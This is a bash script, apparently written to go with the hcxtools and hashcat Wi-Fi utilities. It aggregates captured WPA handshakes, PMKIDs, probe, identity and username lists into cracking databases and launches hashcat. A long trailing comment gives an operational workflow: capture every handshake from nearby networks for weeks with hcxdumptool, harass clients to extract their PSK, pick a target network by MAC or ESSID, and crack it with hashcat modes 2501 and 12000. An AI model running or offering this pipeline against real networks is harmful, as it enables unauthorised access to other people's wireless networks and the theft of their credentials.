#!/bin/bash

INDIR="files";
OUTDIR="database";
ALL="";

while getopts ai:o: arguments; do
  case $arguments in
    i )  INDIR="$OPTARG" ;;
    o )  OUTDIR="$OPTARG" ;;
    a )  ALL="-a" ;;
    \? ) exit 2 ;;  # getopts already reported the illegal option
  esac
done
shift $((OPTIND-1)) # remove parsed options and args from $@ list

if [ "${INDIR: -1}" != "/" ]; then INDIR=${INDIR}"/"; fi
if [ "${OUTDIR}" != "" ] ; then mkdir ${OUTDIR}; fi
if [ "${OUTDIR: -1}" != "/" ]; then OUTDIR=${OUTDIR}"/"; fi

cat ${INDIR}o >> ${OUTDIR}database_best.hccapx
cat ${INDIR}o ${INDIR}O >> ${OUTDIR}database_all.hccapx

cat ${INDIR}z >> ${OUTDIR}database_pmkid_only.hccapx
sort -u ${OUTDIR}"database_pmkid_only.hccapx" > ${OUTDIR}"database_pmkid_only.hccapx.tmp"
cat ${OUTDIR}"database_pmkid_only.hccapx.tmp" > ${OUTDIR}"database_pmkid_only.hccapx"
rm ${OUTDIR}"database_pmkid_only.hccapx.tmp"

cat ${INDIR}E >> ${OUTDIR}"database_probe(E)_list.db"
sort -u ${OUTDIR}"database_probe(E)_list.db" > ${OUTDIR}"database_probe(E)_list.db.tmp"
cat ${OUTDIR}"database_probe(E)_list.db.tmp" > ${OUTDIR}"database_probe(E)_list.db"
rm ${OUTDIR}"database_probe(E)_list.db.tmp"

cat ${INDIR}I >> ${OUTDIR}"database_identitiy(I)_list.db"
sort -u ${OUTDIR}"database_identitiy(I)_list.db" > ${OUTDIR}"database_identitiy(I)_list.db.tmp"
cat ${OUTDIR}"database_identitiy(I)_list.db.tmp" > ${OUTDIR}"database_identitiy(I)_list.db"
rm ${OUTDIR}"database_identitiy(I)_list.db.tmp"

cat ${INDIR}U >> ${OUTDIR}"database_username(U)_list.db"
sort -u ${OUTDIR}"database_username(U)_list.db" > ${OUTDIR}"database_username(U)_list.db.tmp"
cat ${OUTDIR}"database_username(U)_list.db.tmp" > ${OUTDIR}"database_username(U)_list.db"
rm ${OUTDIR}"database_username(U)_list.db.tmp"

cat ${INDIR}P >> ${OUTDIR}"database_pmk(P)_list.db"
sort -u ${OUTDIR}"database_pmk(P)_list.db" > ${OUTDIR}"database_pmk(P)_list.db.tmp"
cat ${OUTDIR}"database_pmk(P)_list.db.tmp" > ${OUTDIR}"database_pmk(P)_list.db"
rm ${OUTDIR}"database_pmk(P)_list.db.tmp"

cat ${OUTDIR}database_*_list.db >> ${OUTDIR}"workinglist.tmp"
sort -u ${OUTDIR}"workinglist.tmp" > ${OUTDIR}"workinglist.db"
rm ${OUTDIR}"workinglist.tmp"

./start_hashcat.sh -o ${OUTDIR} ${ALL}


#---------------------------------------------------------------------------------------
cat j >> "database_john(j)_list.db"
sort -u "database_john(j)_list.db" > "database_john(j).db.tmp"
cat "database_john(j).db.tmp" > "database_john(j)_list.db"
rm "database_john(j).db.tmp"

cat J >> "database_johnRaw(J)_list.db"
sort -u "database_johnRaw(J)_list.db" > "database_johnRaw(J).db.tmp"
cat "database_johnRaw(J).db.tmp" > "database_johnRaw(J)_list.db"
rm "database_johnRaw(J).db.tmp"

cat T >> "database_mgmtTraffic(T)_list.db"
sort -u "database_mgmtTraffic(T)_list.db" > "database_mgmtTraffic(T)_list.db.tmp"
cat "database_mgmtTraffic(T)_list.db.tmp" > "database_mgmtTraffic(T)_list.db"
rm "database_mgmtTraffic(T)_list.db.tmp"

cat g >> "database_GPS(g)_list.db"
sort -u "database_GPS(g)_list.db" > "database_GPS(g)_list.db.tmp"
cat "database_GPS(g)_list.db.tmp" > "database_GPS(g)_list.db"
rm "database_GPS(g)_list.db.tmp"


:<<'multiline_comment'




:<<'multiline_comment'



 wlangenpmkocl use only one GPU each task. If you have 2 GPUs, you can calculate 2 different(!) PMK lists at the same time (or two parts of the same list - you need to split your word list into 2 parts).

hashcat commandline is simple:
hashcat -m 2501 --nonce-error-corrections=128 --remove --logfile-disable --potfile-path=hashcat.2501.pot --outfile-format=2 -o foundhashcat.2501 test.hccapx pmklist

or, if you have an ESSID and a PMK:

$ wlanpmk2hcx -e ESSID -p PMK
hashcat: hash-mode -m 12000 to get password
copy result to hashfile

$ hashcat -m 12000 hashfile_from_wlanpmk2hcx wordlist
to retrieve the PSK

purpose:
- confirm RADIUS PMKs (Royal Class of password recovering)
- weak point analysis (Royal Class of password recovering)
- for the purposes of comparative analysis (Royal Class of password recovering)
- verify allready retrieved keys (cleanup database)
- find PSKs on damaged caps (cleanup database)






1) get all handshakes from established connections in your neigbourhood
hcxdumptool -i interface -o record.pcap -t 5 -b blacklisthome

2) if you got all, focus on (new) clients (longterm - weeks!)
hcxdumptool -i interface -o record.pcap -t 60 -D -b blacklisthome

3) do the conversation
hcxpcaptool -o new.hccapx -E probelist -I identitylist -U usernamelist -P pmklist *.pcap
(if a wpa encrypted hotspot is in range, additionally use -O newall.hccapx to retrieve also connect attemps)

4) add all this raw data to your databases
cat new.hccapx >> database_best.hccapx
cat new.hccapx newall.hccapx >> database_all.hccapx
cat probelist >> databaseprobelist
cat identitylist >> databaseidentitylist
cat usernamelist >> databaseusernamelist
cat pmklist >> databasepmklist
cat database*list > workinglist (and sort this list uniq)
run workinglist against your database_best and use --potfile option of hashcat
create pmklist from hashcat.2500 potfile
cat pmklist >> databasepmklist
from now on, you can run pmklist in combination with --remove against your database and(or incomming to remove allready cracked ones in a very fast way.

Now put your focus on common ESSIDs and get them:
wlanhcx2ssid -i database_xxx.hccapx -X default (you can do this on best and/or raw)
In this case you get full advantage of reuse PBKDF2 on default.hccapx for common ESSIDs

If you need a single ESSID:
wlanhcx2ssid -i database_best.hccapx -w forced.hccapx

Retrieve info about converted networks:
wlanhcxinfo -i forced.hccapx -a -s -e | sort | uniq

and get exact the network you like to attack by mac or ESSID or whatever you like:
wlanhcx2ssid -i forced.hccapx -A mac_ap

Do not try to run useless wordlists found in www (and most of them are useless for your purpose)
Analyze your potfile to get informations about the keyspace of similar networks (same VENDOR and/or ISP)
Use -O option of hcxpcaptool (maybe a clients made a typo - half PSK, you are able to crack)
Analyze probelist (myabe PSK or simlilar PSK is inside)
Build your own wordlist based on your database lists and run rules on them
cat database lists and cracked to one list and run princeattack
Annoy the client to retrieve his NVRAM and or PSK - longterm: hcxdumptool -i interface -o record.pcap -t 60 -D -b blacklisthome
(that is not the same like a "normal" rogue AP or an evil twin - we are on protocol level)
multiline_comment
